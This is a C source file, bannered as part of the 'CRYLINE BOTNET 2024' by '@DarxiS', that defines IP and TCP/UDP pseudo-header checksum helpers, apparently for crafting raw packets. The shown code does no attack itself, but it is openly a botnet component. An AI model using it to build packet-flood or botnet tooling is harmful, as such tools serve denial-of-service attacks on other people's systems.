/* 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; CRYLINE BOTNET 2024  ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
*/

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <linux/ip.h>

#include "LIBRARIES.h"
#include "CHECK_SUM.h"

uint16_t __CHECK_SUM_GENERIC(uint16_t *_SET_ADDRESS, uint32_t _SET_COUNTER)
{
    register unsigned long GET_SUM = 0;

    for (GET_SUM = 0; _SET_COUNTER > 1; _SET_COUNTER -= 2)
    {
        GET_SUM += *_SET_ADDRESS++;
    }

    if (_SET_COUNTER == 1)
    {
        GET_SUM += (char)*_SET_ADDRESS;
    }

    GET_SUM = (GET_SUM >> 16) + (GET_SUM & 0xFFFF);
    GET_SUM += (GET_SUM >> 16);
    
    return ~GET_SUM;
}

uint16_t __CHECK_SUM_TCP_AND_UDP(struct iphdr *_SET_IP_HEADERS, void *_SET_BUFFER, uint16_t _SET_DATA_LENGHT, int _SET_LENGHT)
{
    const uint16_t *SET_LOCAL_BUFFER = _SET_BUFFER;

    uint32_t SOURCE_IP_ADDRESS = _SET_IP_HEADERS->saddr;
    uint32_t DESTINATION_IP_ADDRESS = _SET_IP_HEADERS->daddr;
    uint32_t GET_SUM = 0;
    
    while (_SET_LENGHT > 1)
    {
        GET_SUM += *SET_LOCAL_BUFFER;
        SET_LOCAL_BUFFER++;
        _SET_LENGHT -= 2;
    }

    if (_SET_LENGHT == 1)
    {
        GET_SUM += *((uint8_t *) SET_LOCAL_BUFFER);
    }

    GET_SUM += (SOURCE_IP_ADDRESS >> 16) & 0xFFFF;
    GET_SUM += SOURCE_IP_ADDRESS & 0xFFFF;
    GET_SUM += (DESTINATION_IP_ADDRESS >> 16) & 0xFFFF;
    GET_SUM += DESTINATION_IP_ADDRESS & 0xFFFF;
    GET_SUM += htons(_SET_IP_HEADERS->protocol);
    GET_SUM += _SET_DATA_LENGHT;

    while (GET_SUM >> 16)
    {
        GET_SUM = (GET_SUM & 0xFFFF) + (GET_SUM >> 16);
    }

    return ((uint16_t) (~GET_SUM));
}
